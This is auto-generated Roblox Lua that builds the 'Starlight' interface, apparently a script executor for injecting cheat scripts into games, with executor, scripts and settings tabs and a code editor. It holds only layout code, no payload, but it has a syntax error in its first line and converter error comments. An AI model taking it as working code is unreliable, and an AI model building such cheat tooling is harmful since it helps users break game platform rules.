local G2L = {};

-- StarterGui.Starlight
G2L["1"] = Instance.new("ScreenGui", game:GetService("CoreGui");
G2L["1"]["IgnoreGuiInset"] = true;
G2L["1"]["DisplayOrder"] = 1999999999;
G2L["1"]["ScreenInsets"] = Enum.ScreenInsets.DeviceSafeInsets;
G2L["1"]["Name"] = [[Starlight]];
G2L["1"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling;
G2L["1"]["ResetOnSpawn"] = false;


-- StarterGui.Starlight.MainFrame
G2L["2"] = Instance.new("Frame", G2L["1"]);
G2L["2"]["BorderSizePixel"] = 0;
G2L["2"]["BackgroundColor3"] = Color3.fromRGB(13, 13, 13);
G2L["2"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["2"]["ClipsDescendants"] = true;
G2L["2"]["Size"] = UDim2.new(0, 600, 0, 350);
G2L["2"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);
G2L["2"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2"]["Name"] = [[MainFrame]];


-- StarterGui.Starlight.MainFrame.UICorner
G2L["3"] = Instance.new("UICorner", G2L["2"]);
G2L["3"]["CornerRadius"] = UDim.new(0, 6);


-- StarterGui.Starlight.MainFrame.UIStroke
G2L["4"] = Instance.new("UIStroke", G2L["2"]);
G2L["4"]["Thickness"] = 0.7;
G2L["4"]["Color"] = Color3.fromRGB(90, 90, 90);
G2L["4"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;


-- StarterGui.Starlight.MainFrame.Logo
G2L["5"] = Instance.new("ImageLabel", G2L["2"]);
G2L["5"]["BorderSizePixel"] = 0;
G2L["5"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["5"]["Image"] = [[rbxassetid://138561242127995]];
G2L["5"]["Size"] = UDim2.new(0, 180, 0, 60);
G2L["5"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["5"]["BackgroundTransparency"] = 1;
G2L["5"]["Name"] = [[Logo]];
G2L["5"]["Position"] = UDim2.new(0, 16, 0, 16);


-- StarterGui.Starlight.MainFrame.Exit
G2L["6"] = Instance.new("TextButton", G2L["2"]);
G2L["6"]["BorderSizePixel"] = 0;
G2L["6"]["TextSize"] = 14;
G2L["6"]["AutoButtonColor"] = false;
G2L["6"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["6"]["BackgroundColor3"] = Color3.fromRGB(17, 17, 17);
G2L["6"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["6"]["Size"] = UDim2.new(0, 42, 0, 42);
G2L["6"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["6"]["Text"] = [[]];
G2L["6"]["Name"] = [[Exit]];
G2L["6"]["Position"] = UDim2.new(1, -64, 0, 24);


-- StarterGui.Starlight.MainFrame.Exit.UICorner
G2L["7"] = Instance.new("UICorner", G2L["6"]);
G2L["7"]["CornerRadius"] = UDim.new(0, 6);


-- StarterGui.Starlight.MainFrame.Exit.UIStroke
G2L["8"] = Instance.new("UIStroke", G2L["6"]);
G2L["8"]["Thickness"] = 1.5;
G2L["8"]["Color"] = Color3.fromRGB(58, 58, 58);
G2L["8"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;


-- StarterGui.Starlight.MainFrame.Exit.Icon
G2L["9"] = Instance.new("ImageLabel", G2L["6"]);
G2L["9"]["Interactable"] = false;
G2L["9"]["BorderSizePixel"] = 0;
G2L["9"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["9"]["ImageColor3"] = Color3.fromRGB(145, 145, 145);
G2L["9"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["9"]["Image"] = [[rbxassetid://12953907125]];
G2L["9"]["Size"] = UDim2.new(0, 35, 0, 35);
G2L["9"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["9"]["BackgroundTransparency"] = 1;
G2L["9"]["Name"] = [[Icon]];
G2L["9"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);


-- StarterGui.Starlight.MainFrame.Minimize
G2L["a"] = Instance.new("TextButton", G2L["2"]);
G2L["a"]["BorderSizePixel"] = 0;
G2L["a"]["TextSize"] = 14;
G2L["a"]["AutoButtonColor"] = false;
G2L["a"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["a"]["BackgroundColor3"] = Color3.fromRGB(17, 17, 17);
G2L["a"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["a"]["Size"] = UDim2.new(0, 42, 0, 42);
G2L["a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["a"]["Text"] = [[]];
G2L["a"]["Name"] = [[Minimize]];
G2L["a"]["Position"] = UDim2.new(1, -120, 0, 24);


-- StarterGui.Starlight.MainFrame.Minimize.UICorner
G2L["b"] = Instance.new("UICorner", G2L["a"]);
G2L["b"]["CornerRadius"] = UDim.new(0, 6);


-- StarterGui.Starlight.MainFrame.Minimize.UIStroke
G2L["c"] = Instance.new("UIStroke", G2L["a"]);
G2L["c"]["Thickness"] = 1.5;
G2L["c"]["Color"] = Color3.fromRGB(58, 58, 58);
G2L["c"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;


-- StarterGui.Starlight.MainFrame.Minimize.Icon
G2L["d"] = Instance.new("ImageLabel", G2L["a"]);
G2L["d"]["Interactable"] = false;
G2L["d"]["BorderSizePixel"] = 0;
G2L["d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["d"]["ImageColor3"] = Color3.fromRGB(145, 145, 145);
G2L["d"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["d"]["Image"] = [[rbxassetid://125716871945612]];
G2L["d"]["Size"] = UDim2.new(0, 35, 0, 35);
G2L["d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["d"]["BackgroundTransparency"] = 1;
G2L["d"]["Name"] = [[Icon]];
G2L["d"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);


-- StarterGui.Starlight.MainFrame.Handler
G2L["e"] = Instance.new("LocalScript", G2L["2"]);
G2L["e"]["Name"] = [[Handler]];


-- StarterGui.Starlight.MainFrame.Insides
G2L["f"] = Instance.new("CanvasGroup", G2L["2"]);
G2L["f"]["BorderSizePixel"] = 0;
G2L["f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["f"]["Size"] = UDim2.new(1, 0, 1, -85);
G2L["f"]["Position"] = UDim2.new(0, 0, 0, 85);
G2L["f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["f"]["Name"] = [[Insides]];
G2L["f"]["BackgroundTransparency"] = 1;


-- StarterGui.Starlight.MainFrame.Insides.TabSelector
G2L["10"] = Instance.new("Frame", G2L["f"]);
G2L["10"]["BorderSizePixel"] = 0;
G2L["10"]["BackgroundColor3"] = Color3.fromRGB(9, 9, 9);
G2L["10"]["Size"] = UDim2.new(0, 56, 1, -20);
G2L["10"]["Position"] = UDim2.new(0, 15, 0, 5);
G2L["10"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["10"]["Name"] = [[TabSelector]];


-- StarterGui.Starlight.MainFrame.Insides.TabSelector.UICorner
G2L["11"] = Instance.new("UICorner", G2L["10"]);
G2L["11"]["CornerRadius"] = UDim.new(0, 6);


-- StarterGui.Starlight.MainFrame.Insides.TabSelector.UIStroke
G2L["12"] = Instance.new("UIStroke", G2L["10"]);
G2L["12"]["Thickness"] = 0.7;
G2L["12"]["Color"] = Color3.fromRGB(90, 90, 90);
G2L["12"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;


-- StarterGui.Starlight.MainFrame.Insides.TabSelector.Executor
G2L["13"] = Instance.new("TextButton", G2L["10"]);
G2L["13"]["BorderSizePixel"] = 0;
G2L["13"]["TextSize"] = 14;
G2L["13"]["AutoButtonColor"] = false;
G2L["13"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["13"]["BackgroundColor3"] = Color3.fromRGB(17, 17, 17);
G2L["13"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["13"]["AnchorPoint"] = Vector2.new(0.5, 0);
G2L["13"]["Size"] = UDim2.new(0, 42, 0, 42);
G2L["13"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["13"]["Text"] = [[]];
G2L["13"]["Name"] = [[Executor]];
G2L["13"]["Position"] = UDim2.new(0.5, 0, 0, 6);


-- StarterGui.Starlight.MainFrame.Insides.TabSelector.Executor.UICorner
G2L["14"] = Instance.new("UICorner", G2L["13"]);
G2L["14"]["CornerRadius"] = UDim.new(0, 6);


-- StarterGui.Starlight.MainFrame.Insides.TabSelector.Executor.UIStroke
G2L["15"] = Instance.new("UIStroke", G2L["13"]);
G2L["15"]["Thickness"] = 1.5;
G2L["15"]["Color"] = Color3.fromRGB(58, 58, 58);
G2L["15"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;


-- StarterGui.Starlight.MainFrame.Insides.TabSelector.Executor.Icon
G2L["16"] = Instance.new("ImageLabel", G2L["13"]);
G2L["16"]["Interactable"] = false;
G2L["16"]["BorderSizePixel"] = 0;
G2L["16"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["16"]["ImageColor3"] = Color3.fromRGB(145, 145, 145);
G2L["16"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["16"]["Image"] = [[rbxassetid://11663743444]];
G2L["16"]["Size"] = UDim2.new(0, 35, 0, 35);
G2L["16"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["16"]["BackgroundTransparency"] = 1;
G2L["16"]["Name"] = [[Icon]];
G2L["16"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);


-- StarterGui.Starlight.MainFrame.Insides.TabSelector.Scripts
G2L["17"] = Instance.new("TextButton", G2L["10"]);
G2L["17"]["BorderSizePixel"] = 0;
G2L["17"]["TextSize"] = 14;
G2L["17"]["AutoButtonColor"] = false;
G2L["17"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["17"]["BackgroundColor3"] = Color3.fromRGB(17, 17, 17);
G2L["17"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["17"]["AnchorPoint"] = Vector2.new(0.5, 0);
G2L["17"]["Size"] = UDim2.new(0, 42, 0, 42);
G2L["17"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["17"]["Text"] = [[]];
G2L["17"]["Name"] = [[Scripts]];
G2L["17"]["Position"] = UDim2.new(0.5, 0, 0, 55);


-- StarterGui.Starlight.MainFrame.Insides.TabSelector.Scripts.UICorner
G2L["18"] = Instance.new("UICorner", G2L["17"]);
G2L["18"]["CornerRadius"] = UDim.new(0, 6);


-- StarterGui.Starlight.MainFrame.Insides.TabSelector.Scripts.UIStroke
G2L["19"] = Instance.new("UIStroke", G2L["17"]);
G2L["19"]["Thickness"] = 1.5;
G2L["19"]["Color"] = Color3.fromRGB(58, 58, 58);
G2L["19"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;


-- StarterGui.Starlight.MainFrame.Insides.TabSelector.Scripts.Icon
G2L["1a"] = Instance.new("ImageLabel", G2L["17"]);
G2L["1a"]["Interactable"] = false;
G2L["1a"]["BorderSizePixel"] = 0;
G2L["1a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1a"]["ImageColor3"] = Color3.fromRGB(145, 145, 145);
G2L["1a"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["1a"]["Image"] = [[rbxassetid://11570895459]];
G2L["1a"]["Size"] = UDim2.new(0, 35, 0, 35);
G2L["1a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1a"]["BackgroundTransparency"] = 1;
G2L["1a"]["Name"] = [[Icon]];
G2L["1a"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);


-- StarterGui.Starlight.MainFrame.Insides.TabSelector.Settings
G2L["1b"] = Instance.new("TextButton", G2L["10"]);
G2L["1b"]["BorderSizePixel"] = 0;
G2L["1b"]["TextSize"] = 14;
G2L["1b"]["AutoButtonColor"] = false;
G2L["1b"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1b"]["BackgroundColor3"] = Color3.fromRGB(17, 17, 17);
G2L["1b"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["1b"]["AnchorPoint"] = Vector2.new(0.5, 0);
G2L["1b"]["Size"] = UDim2.new(0, 42, 0, 42);
G2L["1b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1b"]["Text"] = [[]];
G2L["1b"]["Name"] = [[Settings]];
G2L["1b"]["Position"] = UDim2.new(0.5, 0, 0, 105);


-- StarterGui.Starlight.MainFrame.Insides.TabSelector.Settings.UICorner
G2L["1c"] = Instance.new("UICorner", G2L["1b"]);
G2L["1c"]["CornerRadius"] = UDim.new(0, 6);


-- StarterGui.Starlight.MainFrame.Insides.TabSelector.Settings.UIStroke
G2L["1d"] = Instance.new("UIStroke", G2L["1b"]);
G2L["1d"]["Thickness"] = 1.5;
G2L["1d"]["Color"] = Color3.fromRGB(58, 58, 58);
G2L["1d"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;


-- StarterGui.Starlight.MainFrame.Insides.TabSelector.Settings.Icon
G2L["1e"] = Instance.new("ImageLabel", G2L["1b"]);
G2L["1e"]["Interactable"] = false;
G2L["1e"]["BorderSizePixel"] = 0;
G2L["1e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1e"]["ImageColor3"] = Color3.fromRGB(145, 145, 145);
G2L["1e"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["1e"]["Image"] = [[rbxassetid://13568966069]];
G2L["1e"]["Size"] = UDim2.new(0, 38, 0, 35);
G2L["1e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1e"]["BackgroundTransparency"] = 1;
G2L["1e"]["Name"] = [[Icon]];
G2L["1e"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);


-- StarterGui.Starlight.MainFrame.Insides.TabSelector.Status
G2L["1f"] = Instance.new("Frame", G2L["10"]);
G2L["1f"]["BorderSizePixel"] = 0;
G2L["1f"]["BackgroundColor3"] = Color3.fromRGB(255, 76, 76);
G2L["1f"]["AnchorPoint"] = Vector2.new(0.5, 0);
G2L["1f"]["Size"] = UDim2.new(0, 30, 0, 30);
G2L["1f"]["Position"] = UDim2.new(0.5, 0, 1, -45);
G2L["1f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1f"]["Name"] = [[Status]];


-- StarterGui.Starlight.MainFrame.Insides.TabSelector.Status.UICorner
G2L["20"] = Instance.new("UICorner", G2L["1f"]);
G2L["20"]["CornerRadius"] = UDim.new(1, 0);


-- StarterGui.Starlight.MainFrame.Insides.Tabs
G2L["21"] = Instance.new("Frame", G2L["f"]);
G2L["21"]["BorderSizePixel"] = 0;
G2L["21"]["BackgroundColor3"] = Color3.fromRGB(9, 9, 9);
G2L["21"]["ClipsDescendants"] = true;
G2L["21"]["Size"] = UDim2.new(1, -100, 1, -20);
G2L["21"]["Position"] = UDim2.new(0, 86, 0, 5);
G2L["21"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["21"]["Name"] = [[Tabs]];


-- StarterGui.Starlight.MainFrame.Insides.Tabs.UICorner
G2L["22"] = Instance.new("UICorner", G2L["21"]);
G2L["22"]["CornerRadius"] = UDim.new(0, 6);


-- StarterGui.Starlight.MainFrame.Insides.Tabs.UIStroke
G2L["23"] = Instance.new("UIStroke", G2L["21"]);
G2L["23"]["Thickness"] = 0.7;
G2L["23"]["Color"] = Color3.fromRGB(90, 90, 90);
G2L["23"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;


-- StarterGui.Starlight.MainFrame.Insides.Tabs.Executor
G2L["24"] = Instance.new("Frame", G2L["21"]);
G2L["24"]["Visible"] = false;
G2L["24"]["BorderSizePixel"] = 0;
G2L["24"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["24"]["ClipsDescendants"] = true;
G2L["24"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["24"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["24"]["Name"] = [[Executor]];
G2L["24"]["BackgroundTransparency"] = 1;


-- StarterGui.Starlight.MainFrame.Insides.Tabs.Executor.UICorner
G2L["25"] = Instance.new("UICorner", G2L["24"]);
G2L["25"]["CornerRadius"] = UDim.new(0, 6);


-- StarterGui.Starlight.MainFrame.Insides.Tabs.Executor.FastColoredTextboxV3
G2L["26"] = Instance.new("Frame", G2L["24"]);
G2L["26"]["BorderSizePixel"] = 0;
G2L["26"]["BackgroundColor3"] = Color3.fromRGB(17, 17, 17);
G2L["26"]["AnchorPoint"] = Vector2.new(0.5, 0);
G2L["26"]["Size"] = UDim2.new(1, -20, 1, -72);
G2L["26"]["Position"] = UDim2.new(0.5, 0, 0, 10);
G2L["26"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
G2L["26"]["Name"] = [[FastColoredTextboxV3]];
G2L["26"]["BackgroundTransparency"] = 1;


-- StarterGui.Starlight.MainFrame.Insides.Tabs.Executor.FastColoredTextboxV3.Main
G2L["27"] = Instance.new("Frame", G2L["26"]);
G2L["27"]["ZIndex"] = 2;
G2L["27"]["BorderSizePixel"] = 0;
G2L["27"]["BackgroundColor3"] = Color3.fromRGB(17, 17, 17);
G2L["27"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["27"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
G2L["27"]["Name"] = [[Main]];


-- StarterGui.Starlight.MainFrame.Insides.Tabs.Executor.FastColoredTextboxV3.Main.Scroll
G2L["28"] = Instance.new("ScrollingFrame", G2L["27"]);
G2L["28"]["Active"] = true;
G2L["28"]["ZIndex"] = 2;
G2L["28"]["BorderSizePixel"] = 0;
G2L["28"]["CanvasSize"] = UDim2.new(0, 0, 0, 0);
-- [ERROR] cannot convert TopImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["28"]["TopImage"] = [[rbxasset://textures/ui/Scroll/scroll-middle.png]];
G2L["28"]["Name"] = [[Scroll]];
G2L["28"]["BackgroundColor3"] = Color3.fromRGB(81, 81, 81);
-- [ERROR] cannot convert BottomImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["28"]["BottomImage"] = [[rbxasset://textures/ui/Scroll/scroll-middle.png]];
G2L["28"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["28"]["ScrollBarImageColor3"] = Color3.fromRGB(122, 122, 122);
G2L["28"]["BorderColor3"] = Color3.fromRGB(127, 129, 126);
G2L["28"]["BackgroundTransparency"] = 1;


-- StarterGui.Starlight.MainFrame.Insides.Tabs.Executor.FastColoredTextboxV3.Main.Scroll.TextBox
G2L["29"] = Instance.new("TextBox", G2L["28"]);
G2L["29"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["29"]["BorderSizePixel"] = 0;
G2L["29"]["TextWrapped"] = true;
G2L["29"]["TextTransparency"] = 0.775;
G2L["29"]["TextSize"] = 15;
G2L["29"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["29"]["TextYAlignment"] = Enum.TextYAlignment.Top;
G2L["29"]["BackgroundColor3"] = Color3.fromRGB(29, 35, 46);
G2L["29"]["RichText"] = true;
G2L["29"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["29"]["MultiLine"] = true;
G2L["29"]["ClearTextOnFocus"] = false;
G2L["29"]["Size"] = UDim2.new(10, -27, 1, 0);
G2L["29"]["Position"] = UDim2.new(0, 34, 0, 0);
G2L["29"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["29"]["Text"] = [[]];
G2L["29"]["BackgroundTransparency"] = 1;


-- StarterGui.Starlight.MainFrame.Insides.Tabs.Executor.FastColoredTextboxV3.Main.Scroll.Highlighting
G2L["2a"] = Instance.new("TextLabel", G2L["28"]);
G2L["2a"]["TextWrapped"] = true;
G2L["2a"]["BorderSizePixel"] = 0;
G2L["2a"]["TextSize"] = 15;
G2L["2a"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["2a"]["TextYAlignment"] = Enum.TextYAlignment.Top;
G2L["2a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2a"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["2a"]["TextColor3"] = Color3.fromRGB(221, 221, 221);
G2L["2a"]["BackgroundTransparency"] = 1;
G2L["2a"]["RichText"] = true;
G2L["2a"]["Size"] = UDim2.new(10, -27, 1, 0);
G2L["2a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2a"]["Text"] = [[]];
G2L["2a"]["Name"] = [[Highlighting]];
G2L["2a"]["Position"] = UDim2.new(0, 34, 0, 0);


-- StarterGui.Starlight.MainFrame.Insides.Tabs.Executor.FastColoredTextboxV3.Main.Scroll.LineSelector
G2L["2b"] = Instance.new("Frame", G2L["28"]);
G2L["2b"]["ZIndex"] = -7;
G2L["2b"]["BorderSizePixel"] = 0;
G2L["2b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2b"]["Size"] = UDim2.new(1, 0, 0, 14);
G2L["2b"]["Position"] = UDim2.new(0, 34, 0, 0);
G2L["2b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2b"]["Name"] = [[LineSelector]];
G2L["2b"]["BackgroundTransparency"] = 1;


-- StarterGui.Starlight.MainFrame.Insides.Tabs.Executor.FastColoredTextboxV3.Main.Scroll.LineSelector.Outline
G2L["2c"] = Instance.new("UIStroke", G2L["2b"]);
G2L["2c"]["Color"] = Color3.fromRGB(46, 46, 46);
G2L["2c"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["2c"]["Name"] = [[Outline]];


-- StarterGui.Starlight.MainFrame.Insides.Tabs.Executor.FastColoredTextboxV3.Main.Scroll.Cursor
G2L["2d"] = Instance.new("Frame", G2L["28"]);
G2L["2d"]["Visible"] = false;
G2L["2d"]["BorderSizePixel"] = 0;
G2L["2d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2d"]["Size"] = UDim2.new(0, 1, 0, 15);
G2L["2d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2d"]["Name"] = [[Cursor]];


-- StarterGui.Starlight.MainFrame.Insides.Tabs.Executor.FastColoredTextboxV3.Main.Scroll.TextMeasurer
G2L["2e"] = Instance.new("TextLabel", G2L["28"]);
G2L["2e"]["BorderSizePixel"] = 0;
G2L["2e"]["TextSize"] = 15;
G2L["2e"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["2e"]["TextYAlignment"] = Enum.TextYAlignment.Top;
G2L["2e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2e"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["2e"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2e"]["BackgroundTransparency"] = 1;
G2L["2e"]["RichText"] = true;
G2L["2e"]["Size"] = UDim2.new(10, -27, 1, 0);
G2L["2e"]["Visible"] = false;
G2L["2e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2e"]["Text"] = [[]];
G2L["2e"]["Name"] = [[TextMeasurer]];
G2L["2e"]["Position"] = UDim2.new(0, 34, 0, 0);


-- StarterGui.Starlight.MainFrame.Insides.Tabs.Executor.FastColoredTextboxV3.Main.Scroll.LinesValue
G2L["2f"] = Instance.new("NumberValue", G2L["28"]);
G2L["2f"]["Name"] = [[LinesValue]];
G2L["2f"]["Value"] = 1;


-- StarterGui.Starlight.MainFrame.Insides.Tabs.Executor.FastColoredTextboxV3.Main.Scroll.LinesFrame
G2L["30"] = Instance.new("Frame", G2L["28"]);
G2L["30"]["BorderSizePixel"] = 0;
G2L["30"]["BackgroundColor3"] = Color3.fromRGB(39, 39, 39);
G2L["30"]["Size"] = UDim2.new(0, 34, 17.918, 0);
G2L["30"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["30"]["Name"] = [[LinesFrame]];
G2L["30"]["BackgroundTransparency"] = 1;


-- StarterGui.Starlight.MainFrame.Insides.Tabs.Executor.FastColoredTextboxV3.Main.Scroll.LinesFrame.Template
G2L["31"] = Instance.new("TextLabel", G2L["30"]);
G2L["31"]["TextWrapped"] = true;
G2L["31"]["BorderSizePixel"] = 0;
G2L["31"]["TextSize"] = 15;
G2L["31"]["TextTransparency"] = 0.5;
G2L["31"]["TextScaled"] = true;
G2L["31"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["31"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["31"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["31"]["BackgroundTransparency"] = 1;
G2L["31"]["Size"] = UDim2.new(0, 34, 0, 15);
G2L["31"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["31"]["Text"] = [[1]];
G2L["31"]["Name"] = [[Template]];


-- StarterGui.Starlight.MainFrame.Insides.Tabs.Executor.FastColoredTextboxV3.Main.Scroll.LinesFrame.UIListLayout
G2L["32"] = Instance.new("UIListLayout", G2L["30"]);
G2L["32"]["SortOrder"] = Enum.SortOrder.LayoutOrder;


-- StarterGui.Starlight.MainFrame.Insides.Tabs.Executor.FastColoredTextboxV3.Main.Scroll.SuggestionBox
G2L["33"] = Instance.new("Frame", G2L["28"]);
G2L["33"]["ZIndex"] = 50;
G2L["33"]["BorderSizePixel"] = 0;
G2L["33"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["33"]["AutomaticSize"] = Enum.AutomaticSize.XY;
G2L["33"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["33"]["Name"] = [[SuggestionBox]];


-- StarterGui.Starlight.MainFrame.Insides.Tabs.Executor.FastColoredTextboxV3.Main.Scroll.SuggestionBox.UIListLayout
G2L["34"] = Instance.new("UIListLayout", G2L["33"]);
G2L["34"]["SortOrder"] = Enum.SortOrder.LayoutOrder;


-- StarterGui.Starlight.MainFrame.Insides.Tabs.Executor.FastColoredTextboxV3.Main.Scroll.SuggestionBox.Example
G2L["35"] = Instance.new("Frame", G2L["33"]);
G2L["35"]["Visible"] = false;
G2L["35"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["35"]["AutomaticSize"] = Enum.AutomaticSize.X;
G2L["35"]["Size"] = UDim2.new(0, 0, 0, 25);
G2L["35"]["BorderColor3"] = Color3.fromRGB(247, 247, 247);
G2L["35"]["Name"] = [[Example]];
G2L["35"]["BackgroundTransparency"] = 1;


-- StarterGui.Starlight.MainFrame.Insides.Tabs.Executor.FastColoredTextboxV3.Main.Scroll.SuggestionBox.Example.Icon
G2L["36"] = Instance.new("ImageLabel", G2L["35"]);
G2L["36"]["BorderSizePixel"] = 0;
G2L["36"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["36"]["ImageTransparency"] = 0.6;
G2L["36"]["ImageColor3"] = Color3.fromRGB(0, 0, 0);
G2L["36"]["AnchorPoint"] = Vector2.new(0, 0.5);
G2L["36"]["Image"] = [[rbxassetid://9087232887]];
G2L["36"]["Size"] = UDim2.new(0, 16, 0, 16);
G2L["36"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["36"]["BackgroundTransparency"] = 1;
G2L["36"]["Name"] = [[Icon]];
G2L["36"]["Position"] = UDim2.new(0, 4, 0.5, 0);


-- StarterGui.Starlight.MainFrame.Insides.Tabs.Executor.FastColoredTextboxV3.Main.Scroll.SuggestionBox.Example.Label
G2L["37"] = Instance.new("TextLabel", G2L["35"]);
G2L["37"]["BorderSizePixel"] = 0;
G2L["37"]["TextSize"] = 16;
G2L["37"]["TextTransparency"] = 0.35;
G2L["37"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["37"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Medium, Enum.FontStyle.Normal);
G2L["37"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["37"]["BackgroundTransparency"] = 1;
G2L["37"]["Size"] = UDim2.new(0, 0, 1, 0);
G2L["37"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["37"]["AutomaticSize"] = Enum.AutomaticSize.X;
G2L["37"]["Name"] = [[Label]];
G2L["37"]["Position"] = UDim2.new(0, 21, 0, 0);


-- StarterGui.Starlight.MainFrame.Insides.Tabs.Executor.FastColoredTextboxV3.Main.Scroll.SuggestionBox.UIStroke
G2L["38"] = Instance.new("UIStroke", G2L["33"]);
G2L["38"]["Color"] = Color3.fromRGB(183, 183, 183);


-- StarterGui.Starlight.MainFrame.Insides.Tabs.Executor.FastColoredTextboxV3.Main.Handler
G2L["39"] = Instance.new("LocalScript", G2L["27"]);
G2L["39"]["Name"] = [[Handler]];


-- StarterGui.Starlight.MainFrame.Insides.Tabs.Executor.FastColoredTextboxV3.Main.UIStroke
